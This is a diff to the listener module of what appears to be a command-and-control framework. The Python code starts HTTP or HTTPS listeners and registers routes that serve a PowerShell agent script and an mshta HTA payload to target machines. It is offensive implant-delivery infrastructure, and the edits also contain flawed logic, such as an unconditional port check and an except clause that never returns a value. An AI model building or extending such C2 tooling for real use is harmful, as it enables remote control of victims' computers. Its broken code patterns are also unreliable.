@@ -54,9 +54,14 @@ class NewListener:
 
     if self.arguments == 6:
         self.ssl = False
+            #check_listener_port(self.bindip, self.bindport)
         thread = threading.Thread(target=app.run, args=(host))
         thread.daemon = True
         thread.start()
+        listeners_information[self.name] = [self.name, self.bindip, self.bindport, self.host, self.interval, self.path, self.ssl]
+        return True
+        #else:
+        #    print(colored("[-] Port in use or you don't have permession to bind it", "red"))
     if self.arguments == 8:
         # certficates path (worked !)
         self.ssl = True
@@ -66,10 +71,14 @@ class NewListener:
         # which is generated from letsencrypt certbot !
 
         cert = {"ssl_context": (self.cert, self.key)}
+        check_listener_port(self.bindip, self.bindport)
         thread = threading.Thread(target=app.run, args=(host), kwargs=cert)
         thread.daemon = True
         thread.start()
-    listeners_information[self.name] = [self.name, self.bindip, self.bindport, self.host, self.interval, self.path, self.ssl]
+        listeners_information[self.name] = [self.name, self.bindip, self.bindport, self.host, self.interval, self.path, self.ssl]
+        return True
+        #else:
+        #    print(colored("[-] Port in use or you don't have permession to bind it", "red"))
   def powershell_code(self):
         f = open("agents/agent.ps1.oct")
         if self.ssl:
@@ -95,7 +104,11 @@ class NewListener:
 
 
   def create_path(self):
-      app.add_url_rule("/%s" % self.path, self.host, self.powershell_code)
+      try:
+          app.add_url_rule("/%s" % self.path, self.host, self.powershell_code)
+          return True
+      except:
+          False
 
   def create_hta(self):
       app.add_url_rule(mshta_url, "hta" , self.hta)
